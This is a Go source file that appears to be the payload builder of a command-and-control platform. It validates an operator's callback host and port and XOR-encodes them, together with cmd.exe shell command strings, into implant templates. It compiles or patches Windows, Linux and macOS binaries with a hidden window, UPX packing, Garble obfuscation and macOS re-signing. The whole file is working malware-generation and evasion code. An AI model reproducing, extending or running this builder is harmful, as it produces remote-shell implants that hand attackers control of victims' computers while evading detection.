package payload

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"unicode"

	implantsrc "c2-platform/implant"
	"c2-platform/implant/templates"
)

const xorKey = 0x5A

var (
	ErrNoCompiler = errors.New("mingw compiler not found")
	ErrInvalid    = errors.New("invalid payload request")

	hostMarker = regexp.MustCompile(`/\* C2_HOST_ENC \*/\s*static const unsigned char enc_host\[\] = \{[^}]*\};`)
	portMarker = regexp.MustCompile(`/\* C2_PORT_ENC \*/\s*static const unsigned char enc_port\[\] = \{[^}]*\};`)
	keyMarker  = regexp.MustCompile(`/\* C2_XOR_KEY \*/\s*static const unsigned char host_xor = 0x[0-9A-Fa-f]{2};`)
	cmdCMarker = regexp.MustCompile(`/\* C2_CMD_C_ENC \*/\s*static const unsigned char enc_cmd_c\[\] = \{[^}]*\};`)
	cmdKMarker = regexp.MustCompile(`/\* C2_CMD_K_ENC \*/\s*static const unsigned char enc_cmd_k\[\] = \{[^}]*\};`)
	filenameRe = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*\.exe$`)
)

type Request struct {
	Host       string
	Port       int
	Filename   string
	Target     string
	Language   string
	Pack       bool
	Obfuscate  bool
	Techniques []string
}

func (r Request) Has(id string) bool {
	for _, t := range r.Techniques {
		if t == id {
			return true
		}
	}
	return false
}

type Result struct {
	Filename   string
	Host       string
	Port       int
	Bytes      []byte
	Techniques []string
}

type TargetInfo struct {
	ID       string `json:"id"`
	Label    string `json:"label"`
	Ready    bool   `json:"ready"`
	Compiler string `json:"compiler"`
}

type Meta struct {
	Ready      bool         `json:"ready"`
	Compiler   string       `json:"compiler"`
	OS         string       `json:"os"`
	Arch       string       `json:"arch"`
	Protocol   string       `json:"protocol"`
	Formats    []string     `json:"formats"`
	Systems    []string     `json:"systems"`
	ArchList   []string     `json:"arch_list"`
	Protocols  []string     `json:"protocols"`
	UPX        bool         `json:"upx"`
	Garble     bool         `json:"garble"`
	Languages  []LangInfo   `json:"languages"`
	Techniques []Technique  `json:"techniques"`
	Toolchain  []ChainItem  `json:"toolchain"`
	Targets    []TargetInfo `json:"targets"`
}

type LangInfo struct {
	ID    string `json:"id"`
	Label string `json:"label"`
	Ready bool   `json:"ready"`
	Hint  string `json:"hint"`
}

type ChainItem struct {
	Name    string `json:"name"`
	Detail  string `json:"detail"`
	Bundled bool   `json:"bundled"`
	Ready   bool   `json:"ready"`
}

func Status() Meta {
	cc, err := Compiler()
	label := cc
	if err == nil {
		label = compilerLabel(cc)
	} else {
		label = "未找到 Windows 交叉编译器"
	}
	_, goErr := goBin()
	stubLabel := "内置模板（无需编译器）"
	// The label must describe what Build would actually do: compile when the
	// toolchain is there, otherwise patch the embedded stub.
	goCompile := "go 现场编译（无工具链时回退内置模板）"
	if goErr != nil {
		goCompile = stubLabel
	}
	cCompile := label
	if err != nil {
		cCompile = stubLabel
	}
	goTarget := func(id, name string) TargetInfo {
		return TargetInfo{ID: id, Label: name, Ready: hasTemplate(id) || goErr == nil, Compiler: goCompile}
	}
	targets := []TargetInfo{
		{ID: "windows-x64", Label: "Windows x64", Ready: len(templates.WindowsX64) > 0 || err == nil, Compiler: cCompile},
		goTarget("linux-amd64", "Linux x64"),
		goTarget("linux-arm64", "Linux ARM64"),
		goTarget("darwin-arm64", "macOS Apple Silicon"),
		goTarget("darwin-amd64", "macOS Intel"),
	}
	ready := false
	for _, t := range targets {
		if t.Ready {
			ready = true
			break
		}
	}
	return Meta{
		Ready:     ready,
		Compiler:  label,
		OS:        "windows",
		Arch:      "x64",
		Protocol:  "xor-tcp",
		Formats:   []string{"exe", "elf", "macho"},
		Systems:   []string{"windows", "linux", "darwin"},
		ArchList:  []string{"amd64", "arm64"},
		Protocols: []string{"xor-tcp"},
		UPX:       toolUPX() != "",
		Garble:    toolGarble() != "",
		Languages: []LangInfo{
			{ID: "c", Label: "C（超小体积）", Ready: len(templates.WindowsX64) > 0 || err == nil, Hint: "仅 Windows，预编译模板打补丁，约 30KB"},
			{ID: "go", Label: "Go（跨平台）", Ready: goErr == nil || hasAnyTemplate(), Hint: goLanguageHint(goErr == nil)},
		},
		Techniques: builtinTechniques(),
		Toolchain:  toolchainStatus(cc, err == nil, goErr == nil),
		Targets:    targets,
	}
}

// hasAnyTemplate reports whether at least one embedded stub can serve a Go
// target, which is what a server without a toolchain relies on.
func hasAnyTemplate() bool {
	for _, t := range []string{"linux-amd64", "linux-arm64", "darwin-amd64", "darwin-arm64"} {
		if len(templates.Lookup(t)) > 0 {
			return true
		}
	}
	return false
}

func goLanguageHint(compiled bool) string {
	if compiled {
		return "本机 Go/Garble 现场编译，支持 Windows/Linux/macOS"
	}
	return "内嵌预编译模板打补丁（无需工具链），支持 Windows/Linux/macOS"
}

// hasTemplate reports whether an embedded stub exists for the target.
func hasTemplate(target string) bool {
	return len(templates.Lookup(target)) > 0
}

func stubOr(ok bool, a, b string) string {
	if ok {
		return a
	}
	return b
}

func compilerLabel(cc string) string {
	slash := filepath.ToSlash(cc)
	base := filepath.Base(cc)
	inTools := strings.Contains(slash, "/tools/")
	if base == "zig" || base == "zig.exe" {
		if inTools {
			return "内置 Zig"
		}
		return "系统 Zig"
	}
	if inTools {
		return "内置 MinGW-w64"
	}
	if strings.Contains(base, "mingw") || strings.Contains(slash, "w64-mingw") {
		return "系统 MinGW-w64"
	}
	return base
}

func toolchainStatus(winCC string, winOK, goOK bool) []ChainItem {
	upx := toolUPX()
	garble := toolGarble()
	winBundled := winOK && strings.Contains(filepath.ToSlash(winCC), "/tools/")
	winDetail := "未安装（make tools 可拉取内置 Zig）"
	if winOK {
		winDetail = compilerLabel(winCC)
	}
	goDetail := "未安装"
	if goOK {
		goDetail = "系统 Go"
	}
	upxDetail, upxBundled := "未安装", false
	if upx != "" {
		upxBundled = strings.Contains(filepath.ToSlash(upx), "/tools/")
		if upxBundled {
			upxDetail = "内置 UPX"
		} else {
			upxDetail = "系统 UPX"
		}
	}
	garbleDetail := "未安装"
	if garble != "" {
		garbleDetail = "系统 Garble"
	}
	return []ChainItem{
		{Name: "载荷模板", Detail: "Windows/Linux/macOS 预编译桩（生成时只打补丁）", Bundled: true, Ready: len(templates.WindowsX64) > 0},
		{Name: "Windows 交叉编译", Detail: winDetail, Bundled: winBundled, Ready: winOK},
		{Name: "Go（Linux/macOS）", Detail: goDetail, Bundled: false, Ready: goOK},
		{Name: "UPX 加壳", Detail: upxDetail, Bundled: upxBundled, Ready: upx != ""},
		{Name: "Garble 混淆", Detail: garbleDetail, Bundled: false, Ready: garble != ""},
	}
}

func toolRoots() []string {
	var roots []string
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		roots = append(roots, filepath.Join(dir, "tools"), filepath.Join(dir, "..", "tools"))
	}
	if cwd, err := os.Getwd(); err == nil {
		roots = append(roots, filepath.Join(cwd, "tools"))
	}
	return roots
}

func lookFile(p string) (string, bool) {
	if p == "" {
		return "", false
	}
	st, err := os.Stat(p)
	if err != nil || st.IsDir() {
		return "", false
	}
	return p, true
}

func Compiler() (string, error) {
	if v := strings.TrimSpace(os.Getenv("C2_MINGW_CC")); v != "" {
		if p, err := exec.LookPath(v); err == nil {
			return p, nil
		}
		if p, ok := lookFile(v); ok {
			return p, nil
		}
	}
	for _, root := range toolRoots() {
		cands := []string{
			filepath.Join(root, "zig", "zig"),
			filepath.Join(root, "mingw64", "bin", "x86_64-w64-mingw32-gcc"),
			filepath.Join(root, "llvm-mingw", "bin", "x86_64-w64-mingw32-gcc"),
		}
		for _, c := range cands {
			if p, ok := lookFile(c); ok {
				return p, nil
			}
		}
	}
	if p, err := exec.LookPath("zig"); err == nil {
		return p, nil
	}
	for _, name := range []string{"x86_64-w64-mingw32-gcc", "mingw32-gcc"} {
		if p, err := exec.LookPath(name); err == nil {
			return p, nil
		}
	}
	return "", ErrNoCompiler
}

func validCallbackHost(host string) (string, bool) {
	host = strings.TrimSpace(strings.ToLower(host))
	if host == "" || len(host) > 253 {
		return "", false
	}
	if ip := net.ParseIP(host); ip != nil {
		if ip.To4() == nil || ip.IsUnspecified() || ip.IsMulticast() {
			return "", false
		}
		return ip.To4().String(), true
	}
	if strings.Contains(host, "/") || strings.Contains(host, ":") || strings.Contains(host, " ") {
		return "", false
	}
	ok, _ := regexp.MatchString(`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$`, host)
	if !ok {
		return "", false
	}
	return host, true
}

func FormatOf(target string) string {
	switch {
	case strings.HasPrefix(target, "windows"):
		return "exe"
	case strings.HasPrefix(target, "darwin"):
		return "macho"
	default:
		return "elf"
	}
}

func Validate(req Request) (Request, error) {
	host, ok := validCallbackHost(req.Host)
	if !ok {
		return Request{}, fmt.Errorf("%w: host must be IPv4 or hostname", ErrInvalid)
	}
	if req.Port < 1 || req.Port > 65535 {
		return Request{}, fmt.Errorf("%w: invalid port", ErrInvalid)
	}
	target := strings.TrimSpace(req.Target)
	if target == "" {
		target = "windows-x64"
	}
	switch target {
	case "windows-x64", "linux-amd64", "linux-arm64", "darwin-arm64", "darwin-amd64":
	default:
		return Request{}, fmt.Errorf("%w: unknown target", ErrInvalid)
	}
	name, err := sanitizeFilename(req.Filename, target)
	if err != nil {
		return Request{}, err
	}
	lang := strings.ToLower(strings.TrimSpace(req.Language))
	if lang == "" {
		if strings.HasPrefix(target, "windows") {
			lang = "c"
		} else {
			lang = "go"
		}
	}
	if lang != "c" && lang != "go" {
		return Request{}, fmt.Errorf("%w: language must be c or go", ErrInvalid)
	}
	if lang == "c" && !strings.HasPrefix(target, "windows") {
		return Request{}, fmt.Errorf("%w: C implant is windows only", ErrInvalid)
	}
	var techs []string
	if req.Techniques == nil {
		techs = []string{"xor", "strip"}
		if strings.HasPrefix(target, "windows") {
			techs = append(techs, "gui")
		}
		if req.Pack {
			techs = append(techs, "upx")
		}
		if req.Obfuscate {
			techs = append(techs, "garble")
		}
	} else {
		techs = uniqueIDs(req.Techniques)
	}
	return Request{Host: host, Port: req.Port, Filename: name, Target: target, Language: lang, Techniques: techs, Pack: req.Pack, Obfuscate: req.Obfuscate}, nil
}

func uniqueIDs(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, id := range in {
		id = strings.ToLower(strings.TrimSpace(id))
		if id == "" || seen[id] {
			continue
		}
		seen[id] = true
		out = append(out, id)
	}
	return out
}

func sanitizeFilename(name, target string) (string, error) {
	name = strings.TrimSpace(name)
	if strings.ContainsAny(name, `/\:`) || strings.Contains(name, "..") {
		return "", fmt.Errorf("%w: invalid filename", ErrInvalid)
	}
	name = filepath.Base(name)
	name = strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, name)
	if !strings.HasPrefix(target, "windows") {
		if name == "" {
			return "implant", nil
		}
		if !regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`).MatchString(name) || len(name) > 64 {
			return "", fmt.Errorf("%w: invalid filename", ErrInvalid)
		}
		return name, nil
	}
	if name == "" {
		return "implant.exe", nil
	}
	if strings.ContainsAny(name, `/\:`) || strings.Contains(name, "..") {
		return "", fmt.Errorf("%w: invalid filename", ErrInvalid)
	}
	name = filepath.Base(name)
	name = strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, name)
	if !strings.HasSuffix(strings.ToLower(name), ".exe") {
		name += ".exe"
	}
	if !filenameRe.MatchString(name) || len(name) > 64 {
		return "", fmt.Errorf("%w: invalid filename", ErrInvalid)
	}
	return name, nil
}

func xorEncode(s string, key byte) []byte {
	out := make([]byte, len(s)+1)
	for i := 0; i < len(s); i++ {
		out[i] = s[i] ^ key
	}
	return out
}

func cArray(b []byte) string {
	parts := make([]string, len(b))
	for i, x := range b {
		parts[i] = fmt.Sprintf("0x%02x", x)
	}
	return strings.Join(parts, ", ")
}

func Patch(src, host, port string, key byte) (string, error) {
	if key == 0 {
		key = xorKey
	}
	if !hostMarker.MatchString(src) || !portMarker.MatchString(src) || !keyMarker.MatchString(src) {
		return "", fmt.Errorf("implant template missing host/port markers")
	}
	hostLine := fmt.Sprintf("/* C2_HOST_ENC */\nstatic const unsigned char enc_host[] = {%s};", cArray(xorEncode(host, key)))
	portLine := fmt.Sprintf("/* C2_PORT_ENC */\nstatic const unsigned char enc_port[] = {%s};", cArray(xorEncode(port, key)))
	keyLine := fmt.Sprintf("/* C2_XOR_KEY */\nstatic const unsigned char host_xor = 0x%02X;", key)
	cmdC := fmt.Sprintf("/* C2_CMD_C_ENC */\nstatic const unsigned char enc_cmd_c[] = {%s};", cArray(xorEncode("cmd.exe /c %s", key)))
	cmdK := fmt.Sprintf("/* C2_CMD_K_ENC */\nstatic const unsigned char enc_cmd_k[] = {%s};", cArray(xorEncode("cmd.exe /Q /K chcp 65001>nul", key)))
	src = hostMarker.ReplaceAllString(src, hostLine)
	src = portMarker.ReplaceAllString(src, portLine)
	src = keyMarker.ReplaceAllString(src, keyLine)
	src = cmdCMarker.ReplaceAllString(src, cmdC)
	src = cmdKMarker.ReplaceAllString(src, cmdK)
	return src, nil
}

func Build(ctx context.Context, req Request) (*Result, error) {
	req, err := Validate(req)
	if err != nil {
		return nil, err
	}
	if req.Language == "go" {
		return buildGo(ctx, req)
	}
	return buildC(ctx, req)
}

func patchKey(req Request) byte {
	if req.Has("xor") {
		return randXORKey()
	}
	return 0
}

func finishBinary(req Request, raw []byte, tech []string) (*Result, error) {
	b, err := PatchBinary(raw, req.Host, strconv.Itoa(req.Port), patchKey(req))
	if err != nil {
		return nil, err
	}
	if req.Has("xor") {
		tech = append(tech, "回连 XOR")
	}
	tech = append(tech, "协议 XOR")
	if packed, ok := maybePack(b, req.Filename, req.Has("upx")); ok {
		b = packed
		tech = append(tech, "UPX LZMA")
	}
	// Patching (and packing) invalidates the ad-hoc signature Go emits for
	// darwin binaries; arm64 macOS answers that with SIGKILL at exec. Repair it
	// last so the fix covers every earlier stage.
	if strings.HasPrefix(req.Target, "darwin-") {
		if signed, how, ok := signDarwin(b, req.Filename); ok {
			b = signed
			tech = append(tech, how)
		}
	}
	return &Result{Filename: req.Filename, Host: req.Host, Port: req.Port, Bytes: b, Techniques: tech}, nil
}

func buildC(ctx context.Context, req Request) (*Result, error) {
	raw := templates.Lookup(req.Target)
	if len(raw) == 0 {
		compiled, err := compileC(ctx, req)
		if err != nil {
			return nil, err
		}
		raw = compiled
	}
	tech := []string{"C 植入端", "预编译模板", "二进制补丁"}
	if req.Has("gui") {
		tech = append(tech, "无窗口 GUI")
	}
	tech = append(tech, "命令串 XOR")
	return finishBinary(req, raw, tech)
}

func compileC(ctx context.Context, req Request) ([]byte, error) {
	cc, err := Compiler()
	if err != nil {
		return nil, err
	}
	dir, err := os.MkdirTemp("", "c2-payload-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(dir)
	files := map[string]string{
		"implant.c": implantsrc.Source,
		"ops.c":     implantsrc.Ops,
		"implant.h": implantsrc.Header,
	}
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			return nil, err
		}
	}
	out := filepath.Join(dir, "implant.exe")
	gui := req.Has("gui")
	var cmd *exec.Cmd
	if filepath.Base(cc) == "zig" || filepath.Base(cc) == "zig.exe" {
		args := []string{"cc", "-target", "x86_64-windows-gnu", "-Os", "-s",
			"-fno-ident", "-ffunction-sections", "-fdata-sections",
			"-Wl,--gc-sections", "-Wl,--build-id=none",
			"-o", out, "implant.c", "ops.c",
			"-lws2_32", "-lgdi32", "-luser32", "-lole32"}
		if gui {
			args = []string{"cc", "-target", "x86_64-windows-gnu", "-Os", "-s",
				"-fno-ident", "-ffunction-sections", "-fdata-sections",
				"-Wl,--subsystem,windows", "-Wl,--gc-sections", "-Wl,--build-id=none",
				"-o", out, "implant.c", "ops.c",
				"-lws2_32", "-lgdi32", "-luser32", "-lole32"}
		}
		cmd = exec.CommandContext(ctx, cc, args...)
	} else {
		args := []string{"-Os", "-s", "-fno-ident", "-ffunction-sections", "-fdata-sections",
			"-Wl,--gc-sections", "-Wl,--build-id=none",
			"-o", out, "implant.c", "ops.c",
			"-lws2_32", "-lgdi32", "-luser32", "-lole32", "-static"}
		if gui {
			args = append([]string{"-mwindows"}, args...)
		}
		cmd = exec.CommandContext(ctx, cc, args...)
	}
	cmd.Dir = dir
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(stderr.String())
		if msg == "" {
			msg = err.Error()
		}
		if len(msg) > 800 {
			msg = msg[:800]
		}
		return nil, fmt.Errorf("compile failed: %s", msg)
	}
	b, err := os.ReadFile(out)
	if err != nil {
		return nil, err
	}
	if len(b) < 2 || b[0] != 'M' || b[1] != 'Z' {
		return nil, fmt.Errorf("compiler did not produce a PE")
	}
	return b, nil
}
